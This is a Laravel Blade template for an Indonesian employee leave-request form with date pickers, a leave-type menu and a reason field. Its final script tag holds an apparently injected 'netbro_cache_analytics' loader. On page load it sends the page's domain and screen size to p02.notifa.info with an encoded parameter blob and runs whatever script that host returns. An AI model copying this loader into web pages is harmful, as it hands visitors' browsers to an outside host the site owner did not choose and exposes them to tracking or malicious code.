<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Form Izin</title>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/daterangepicker/css/daterangepicker.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/select2/css/select2.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/bootstrap-slider/css/bootstrap-slider.css"/>
  <link rel="stylesheet" href="assets/css/style.css" type="text/css"/>
</head>
<body>

    <!-- Wrapper Start -->
    <div class="be-wrapper">

      <!--  Sidebar Start -->  
      <div class="be-wrapper be-fixed-sidebar">
        @include('Beranda.sidebar')
      </div>
      <!--  Sidebar End -->

      <!-- Content Start -->
      <div class="be-content">
        <div class="page-head">
          <h2 class="page-head-title">Form Izin</h2>          
        </div>
        <div class="main-content container-fluid">
          
        <!--Datepicker-->
        <div class="row">
          <div class="col-md-12">
            <div class="panel panel-default ">
              <div class="panel-heading panel-heading-divider">Form Izin Karyawan</div>
              <div class="panel-body">
                <form action="/formizin/{{Auth::user()->id}}/ajukan_izin" method="POST" style="border-radius: 0px;" class="form-horizontal group-border-dashed">

                 {{ csrf_field() }} 

                  <div class="form-group">
                    <label class="col-sm-3 control-label"> Tanggal Mulai </label>
                    <div class="col-sm-6"">
                      <div data-min-view="2" data-date-format="yyyy-mm-dd" class="input-group date datetimepicker">
                        <input name="tanggal_mulai_izin" size="16" type="date" value="" class="form-control" required=""><span class="input-group-addon btn btn-primary"><i class="icon-th mdi mdi-calendar"></i></span>
                      </div>
                    </div>
                  </div>
                 
                  <div class="form-group">
                    <label class="col-sm-3 control-label"> Tanggal Akhir </label>
                    <div class="col-sm-6"">
                      <div data-min-view="2" data-date-format="yyyy-mm-dd" class="input-group date datetimepicker">
                        <input size="16" name="tanggal_akhir_izin" type="date" value="" class="form-control" required=""><span class="input-group-addon btn btn-primary"><i class="icon-th mdi mdi-calendar"></i></span>
                      </div>
                    </div>
                  </div>

                  <div class="form-group">
                    <label class="col-sm-3 control-label">Tipe Izin</label>
                    <div class="col-sm-6">
                      <select class="select2" name="tipe_izin" required="">
                          <option value="">- Pilih -</option>
                          <option value="Cuti">Cuti</option>
                          <option value="Cuti Penting">Cuti Penting</option>                          
                          <option value="Dinas Luar">Dinas Luar</option>
                          <option value="Dispensasi">Dispensasi</option>
                          <option value="Izin">Izin</option>
                          <option value="SDSD">SDSD</option>
                          <option value="STSD">STSD</option>
                          <option value="Telat">Telat</option>
                        
                      </select>
                    </div>
                  </div>

                  <div class="form-group">
                    <label class="col-sm-3 control-label">Alasan</label>
                    <div class="col-sm-6">
                      <textarea name="alasan_izin" class="form-control" required=""></textarea>
                    </div>
                  </div>

                  <div class="ajukan">                       
                    <button type="button"  class="btn btn-default">Batal</button>
                    <button type="submit"  class="btn btn-primary">Ajukan</button>
                  </div>
                
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div> 
    <!-- Content End -->

    </div>
    <!-- Wrapper End -->

<script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/js/main.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/jquery-ui/jquery-ui.min.js" type="text/javascript"></script>
<script src="assets/lib/jquery.nestable/jquery.nestable.js" type="text/javascript"></script>
<script src="assets/lib/moment.js/min/moment.min.js" type="text/javascript"></script>
<script src="assets/lib/datetimepicker/js/bootstrap-datetimepicker.min.js" type="text/javascript"></script>
<script src="assets/lib/daterangepicker/js/daterangepicker.js" type="text/javascript"></script>
<script src="assets/lib/select2/js/select2.min.js" type="text/javascript"></script>
<script src="assets/lib/select2/js/select2.full.min.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap-slider/js/bootstrap-slider.js" type="text/javascript"></script>
<script type="text/javascript">
  $(document).ready(function(){
    //initialize the javascript
    App.init();
    App.formElements();
  });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUx4sRGOmghaZQzUik2U9TBYmSXhXu8hacxmhsrimwjkastcbF%2f%2bptWMO3vL3FWADfYV6YJR5U4TfMM%2fgfq4HQxs%2b5lorprpnS6d7d%2fjeOEyxkbEYbv0u9P07OhhxndEib3FDljXduGU%2fjBfMKf26rpZvJpQkSIYtWWKDu8jwy9qSgpYsU1ZwmtK9zsjbGiatLj7UIImtFsGQfk9dL1Bm9s98u5s1dIPGRDcR%2bqVvx3nRgTlu3Tpgq7cd0uL8iPsHymUatNeCDJhgBKs%2bI4CNWnEmUr1763V2SmepEeFmq7wJP9WdkWJLD5uhHdKDXKiK4DzTJHZY0mPBnDUczRYASTI0pyILBwedlU9mYHZf2lcyCCh4tDZclG8OaimMnoxnpmQ7nFr2ozRwuiTdypAe3QVM9%2bfHdVBhiVveOqg%2fVdHzy6Ou76QDzkDvoxv8kEdbT808c43co%2frC8Ro2bBStt876Y45haw89mHXvG%2flEvfz8XyW30Z5yHOQ4h1ehr1UNSY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>
